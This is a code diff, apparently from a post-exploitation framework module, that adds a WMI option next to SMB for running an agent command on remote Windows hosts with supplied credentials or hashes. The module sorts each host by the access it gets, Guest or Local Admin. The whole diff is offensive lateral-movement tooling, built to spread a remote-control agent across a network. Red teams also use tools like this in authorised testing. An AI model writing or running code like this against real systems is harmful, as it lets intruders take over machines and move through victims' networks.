@@ -1,5 +1,6 @@
 from lib.common.helpers import *
 from lib.common.smbmap import SMBMap
+from lib.common.wmiexec import WMIEXEC
 from time import sleep
 
 import threading
@@ -54,6 +55,11 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'method' : {
+                'Description'   :   'Method to deploy: SMB, WMI',
+                'Required'      :   True,
+                'Value'         :   'WMI'
+            },
             'proxy' : {
                 'Description'   :   'Proxy to use for request (default, none, or other).',
                 'Required'      :   False,
@@ -92,6 +98,7 @@ class Module:
         smb = SMBMap()
         pass_the_hash = False
 
+        method = self.options['method']['Value']
         listener = self.options['listener']['Value']
         proxy_creds = self.options['proxyCreds']['Value']
         proxy = self.options['proxy']['Value']
@@ -125,17 +132,22 @@ class Module:
             warning("Sending agent...")
 
             try:
-                result = smb.exec_command(host, share, command, False, execute_only=True)
+                access = ''
+                if method.lower() == 'smb':
+                    result = smb.exec_command(host, share, command, False, execute_only=True)
+                    if 'ACCESS_DENIED' in str(result):
+                        output("Failed execution: {}".format(conn_info))
+                        access = 'Guest'
+                    else:
+                        success("Successful execution: {}".format(conn_info))
+                        access = 'Local Admin'
+                elif method.lower() == 'wmi':
+                    wmi = WMIEXEC(command, username, password, domain, hashes=None, aesKey=False, share=share, noOutput=True, doKerberos=False)
+                    result = wmi.run(host)
+                    access = 'Local Admin'
             except:
                 import traceback; traceback.print_exc()
 
-            access = ''
-            if 'ACCESS_DENIED' in str(result):
-                output("Failed execution: {}".format(conn_info))
-                access = 'Guest'
-            else:
-                success("Successful execution: {}".format(conn_info))
-                access = 'Local Admin'
         else:
             info('Failed authentication: {}'.format(conn_info))
             access = 'None'
